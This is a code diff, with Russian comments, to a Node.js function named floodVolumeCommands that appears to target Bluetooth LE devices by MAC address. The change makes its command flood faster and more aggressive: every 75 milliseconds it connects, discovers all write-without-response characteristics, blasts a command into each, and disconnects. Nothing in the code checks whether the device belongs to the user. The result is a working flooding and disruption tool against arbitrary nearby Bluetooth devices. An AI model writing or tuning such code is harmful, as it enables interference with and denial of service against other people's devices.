@@ -670,9 +670,9 @@ function floodVolumeCommands(mac, res) {
     let writableCharacteristics = [];
     let responseSent = false;
 
-    // Функция для запуска флуда
+    // Функция для запуска флуда с подключением/отключением на каждую команду
     function startFlood() {
-      console.log(`Starting flood with ${floodCommands.length} commands for 10 seconds...`);
+      console.log(`Starting ultra-fast flood with ${floodCommands.length} commands for 10 seconds...`);
       
       floodInterval = setInterval(() => {
         if (commandIndex >= floodCommands.length) {
@@ -680,103 +680,102 @@ function floodVolumeCommands(mac, res) {
         }
 
         const cmd = floodCommands[commandIndex];
+        console.log(`Flood command ${commandIndex} (${cmd.toString('hex')}): 75ms cycle Connect → WriteWithoutResponse → Disconnect`);
         
-        // Пишем во все writable характеристики
-        writableCharacteristics.forEach((char, index) => {
-          const useWithoutResponse = char.properties.includes('writeWithoutResponse');
-          
-          try {
-            char.write(cmd, useWithoutResponse, (error) => {
-              if (error) {
-                console.error(`Flood command ${commandIndex} failed on char ${index}:`, error.message);
-              } else {
-                console.log(`Flood command ${commandIndex} (${cmd.toString('hex')}) sent to ${char.uuid}`);
-              }
-            });
-          } catch (err) {
-            console.error(`Error writing to characteristic ${char.uuid}:`, err.message);
-          }
-        });
+        // Подключаемся для каждой команды
+        if (peripheral.state === 'connected') {
+          // Если уже подключены, сначала отключаемся
+          peripheral.disconnect();
+          setTimeout(() => executeCommandWithConnection(cmd), 10);
+        } else {
+          executeCommandWithConnection(cmd);
+        }
         
         commandIndex++;
-      }, 10); // Каждые 100мс новая команда
+      }, 75); // Каждые 75мс новая команда с полным циклом
+    }
+
+    function executeCommandWithConnection(cmd) {
+      const startTime = Date.now();
+      
+      peripheral.connect((error) => {
+        if (error) {
+          console.error(`Connection failed for command ${commandIndex}:`, error.message);
+          return;
+        }
+
+        const connectTime = Date.now() - startTime;
+        console.log(`Connected for command ${commandIndex} in ${connectTime}ms, discovering characteristics...`);
+        
+        // Супер быстрое обнаружение writeWithoutResponse характеристик
+        peripheral.discoverServices([], (error, services) => {
+          if (error) {
+            console.error(`Service discovery failed for command ${commandIndex}:`, error.message);
+            peripheral.disconnect();
+            return;
+          }
+
+          let servicesProcessed = 0;
+          let allWritableChars = [];
+
+          services.forEach(service => {
+            service.discoverCharacteristics([], (error, characteristics) => {
+              servicesProcessed++;
+              
+              if (!error && characteristics) {
+                const writeWithoutResponseChars = characteristics.filter(char => 
+                  char.properties.includes('writeWithoutResponse')
+                );
+                allWritableChars.push(...writeWithoutResponseChars);
+              }
+
+              if (servicesProcessed === services.length) {
+                // Пишем мгновенно во все writeWithoutResponse характеристики
+                let writeCount = 0;
+                allWritableChars.forEach((char, index) => {
+                  try {
+                    char.write(cmd, true, (error) => {
+                      writeCount++;
+                      
+                      if (error) {
+                        console.error(`WriteWithoutResponse failed on char ${index}:`, error.message);
+                      } else {
+                        console.log(`✓ Command ${commandIndex} written to ${char.uuid} (writeWithoutResponse)`);
+                      }
+                      
+                      // Мгновенное отключение после всех записей
+                      if (writeCount === allWritableChars.length) {
+                        const totalTime = Date.now() - startTime;
+                        setTimeout(() => {
+                          peripheral.disconnect();
+                          console.log(`Disconnected after command ${commandIndex} (total: ${totalTime}ms)`);
+                        }, 5); // 5мс задержка перед disconnect
+                      }
+                    });
+                  } catch (err) {
+                    console.error(`Error writing to characteristic ${char.uuid}:`, err.message);
+                    writeCount++;
+                    
+                    if (writeCount === allWritableChars.length) {
+                      setTimeout(() => peripheral.disconnect(), 5);
+                    }
+                  }
+                });
+
+                if (allWritableChars.length === 0) {
+                  console.log(`No writeWithoutResponse characteristics found for command ${commandIndex}`);
+                  peripheral.disconnect();
+                }
+              }
+            });
+          });
+        });
+      });
     }
 
     function startFloodSession() {
-
-      // Подключаемся к устройству
-      if (peripheral.state === 'connected') {
-        isConnected = true;
-        console.log(`Device ${mac} already connected`);
-        return prepareDevice();
-      }
-
-      console.log(`Connecting to ${mac}...`);
-      peripheral.connect((error) => {
-        if (error) {
-          console.error(`Failed to connect to ${mac}:`, error);
-          return res.status(500).json({ 
-            error: "Connection failed", 
-            message: `Failed to connect to ${mac}: ${error.message}` 
-          });
-        }
-
-        isConnected = true;
-        console.log(`Successfully connected to ${mac}`);
-        prepareDevice();
-      });
-    }
-
-    function prepareDevice() {
-      // Находим все writable характеристики
-      peripheral.discoverServices([], (error, services) => {
-        if (error) {
-          console.error('Service discovery failed:', error);
-          return cleanup();
-        }
-
-        let servicesProcessed = 0;
-        let allCharacteristics = [];
-
-        services.forEach(service => {
-          service.discoverCharacteristics([], (error, characteristics) => {
-            if (error) {
-              console.error('Characteristic discovery failed:', error);
-              servicesProcessed++;
-              if (servicesProcessed === services.length) {
-                if (writableCharacteristics.length === 0) {
-                  console.log('No writable characteristics found');
-                  return cleanup();
-                }
-                startFlood();
-              }
-              return;
-            }
-
-            allCharacteristics.push(...characteristics);
-            servicesProcessed++;
-
-            if (servicesProcessed === services.length) {
-              // Фильтруем writable характеристики
-              writableCharacteristics = allCharacteristics.filter(char => 
-                char.properties.includes('write') || char.properties.includes('writeWithoutResponse')
-              );
-
-              console.log(`Found ${writableCharacteristics.length} writable characteristics for flood:`);
-              writableCharacteristics.forEach((char, index) => {
-                console.log(`  ${index + 1}. ${char.uuid} - ${char.properties.join(', ')}`);
-              });
-
-              if (writableCharacteristics.length === 0) {
-                console.log('No writable characteristics found');
-                return cleanup();
-              }
-
-              startFlood();
-            }
-          });
-        });
-      });
+      // Запускаем агрессивный flood с подключением/отключением
+      startFlood();
     }
 
     function cleanup() {
